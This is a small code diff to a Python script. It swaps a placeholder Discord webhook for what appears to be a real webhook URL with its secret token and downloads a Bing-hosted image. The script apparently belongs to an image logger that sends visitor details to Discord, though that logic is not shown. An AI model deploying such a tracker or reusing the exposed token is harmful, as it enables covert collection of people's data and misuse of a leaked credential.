@@ -5,7 +5,7 @@ import base64
 import httpagentparser
 
 # === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
-webhook = 'https://discord.com/api/webhooks/YOUR/WEBHOOK/HERE'
+webhook = 'https://discord.com/api/webhooks/1453028520761626776/N0tjZRoNrNCsBBg0YHXHcPCix0lZhM1TeWsxUQDYTUoLZNdwNVf8nGo-ITX7MFTujFwi'
 
 bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content
 
